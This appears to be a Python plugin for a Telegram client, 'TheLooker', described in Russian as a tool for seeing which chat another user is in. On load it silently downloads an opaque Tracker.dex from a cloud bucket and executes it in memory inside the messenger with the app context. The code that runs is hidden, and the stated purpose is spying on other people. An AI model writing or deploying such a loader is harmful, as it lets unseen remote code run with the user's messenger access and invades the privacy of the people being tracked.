import os
import threading
import requests
from base_plugin import BasePlugin
from java import jclass, jarray, jbyte
from java.nio import ByteBuffer
from dalvik.system import InMemoryDexClassLoader
from org.telegram.messenger import ApplicationLoader

__id__ = "TheLooker"
__name__ = "TheLooker"
__description__ = "Плагин для подглядывания за тем в каком чате сидит собеседник"
__version__ = "1.0"
__author__ = "@swagnonher"
__icon__ = "Animasha26/22"

DEX_URL = "https://storage.yandexcloud.net/4plugins/DOXGRAM100%25NERATKO/Tracker.dex"

class CommonChatsPlugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self.dex_class = None
        self.download_lock = threading.Lock()

    def on_plugin_load(self):
        self.ctx = ApplicationLoader.applicationContext
        self.cache_dir = self.ctx.getCacheDir().getAbsolutePath()
        self.dat_path = os.path.join(self.cache_dir, "Tracker.dat")
        
        threading.Thread(target=self._smart_init, daemon=True).start()

    def on_plugin_unload(self):
        self._unload_native_core()

    def _unload_native_core(self):
        if self.dex_class:
            try:
                self.dex_class.getDeclaredMethod("unload").invoke(None)
                self.log("Нативное DEX-ядро успешно выгружено.")
            except Exception as e:
                self.log(f"Ошибка выгрузки DEX-ядра: {e}")
        self.dex_class = None

    def _smart_init(self):
        with self.download_lock:
            needs_download = False
            remote_size = -1

            try:
                r = requests.head(DEX_URL, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    remote_size = int(r.headers.get("Content-Length", 0))
            except Exception as e:
                self.log(f"Сеть недоступна, используем локальный кэш: {e}")

            if not os.path.exists(self.dat_path) or os.path.getsize(self.dat_path) < 1024:
                needs_download = True
            elif remote_size > 0 and os.path.getsize(self.dat_path) != remote_size:
                self.log("Обнаружено обновление ядра. Скачивание...")
                needs_download = True

            if needs_download:
                if remote_size == -1:
                    self.log("Ошибка: Сеть недоступна, а локальный кэш отсутствует.")
                    return
                
                try:
                    tmp_path = self.dat_path + ".tmp"
                    r = requests.get(DEX_URL, timeout=20)
                    r.raise_for_status()
                    
                    with open(tmp_path, "wb") as f:
                        f.write(r.content)
                        
                    os.replace(tmp_path, self.dat_path)
                    self.log("Ядро успешно обновлено.")
                except Exception as e:
                    self.log(f"Ошибка скачивания ядра: {e}")
                    if os.path.exists(tmp_path):
                        try: os.remove(tmp_path)
                        except: pass
                    return

            self._inject_core_in_memory()

    def _inject_core_in_memory(self):
        try:
            with open(self.dat_path, "rb") as f:
                dex_bytes = f.read()

            java_bytes = jarray(jbyte)(dex_bytes)
            byte_buffer = ByteBuffer.wrap(java_bytes)

            cl = InMemoryDexClassLoader(
                byte_buffer, 
                self.ctx.getClassLoader()
            )
            
            self.dex_class = cl.loadClass("com.swagaplugins.plugin.tracker.Tracker")
            self.dex_class.getDeclaredMethod("init", jclass("android.content.Context"), jclass("java.lang.String")).invoke(None, self.ctx, self.dat_path)
            self.log("Ядро загружено в память устройства.")
        except Exception as e:
            self.log(f"Критическая ошибка загрузки ядра в память: {e}")